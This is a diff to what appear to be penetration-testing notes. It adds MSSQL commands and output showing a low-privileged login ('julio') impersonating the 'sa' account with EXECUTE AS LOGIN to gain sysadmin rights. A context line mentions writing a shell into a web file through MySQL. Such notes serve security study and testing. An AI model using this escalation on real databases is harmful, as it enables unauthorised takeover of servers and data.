@@ -89,6 +89,39 @@ Impersonate Existing Users with MSSQL
 
     (3 rows affected)
 
+And then impersonate the user:
+
+=> check the rights
+    1> SELECT SYSTEM_USER
+    2> SELECT IS_SRVROLEMEMBER('sysadmin')
+    3> go
+
+    -----------
+    julio                                                                                                                    
+
+    (1 rows affected)
+
+    -----------
+            0
+
+    (1 rows affected)
+=> action
+
+    1> EXECUTE AS LOGIN = 'sa'
+    2> SELECT SYSTEM_USER
+    3> SELECT IS_SRVROLEMEMBER('sysadmin')
+    4> GO
+
+    -----------
+    sa
+
+    (1 rows affected)
+
+    -----------
+            1
+
+    (1 rows affected)
+
 ## MYSQL
 
 Regarding mysql we can write a shell into a web file for example:
